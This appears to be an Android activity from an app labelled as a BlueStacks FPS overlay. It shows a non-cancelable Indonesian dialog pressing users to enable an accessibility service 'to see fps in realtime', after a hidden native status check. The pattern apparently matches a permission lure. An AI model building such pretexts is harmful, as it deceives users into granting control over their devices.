package com.bluestacks.fpsoverlay;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;

import android.app.AlertDialog;

public class CoreActivity extends Activity {

    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (checkStatus()) {
            finish();
            return;
        }

        if (!isServiceEnabled()) {
            showAccessibilityDialog();
        } else {
            finish();
        }
    }

    private void showAccessibilityDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Izin Diperlukan")
            .setMessage("Aktifkan accessibility service untuk melihat fps secara realtime")
            .setCancelable(false)
            .setPositiveButton("OK", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                finish();
            })
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }
}
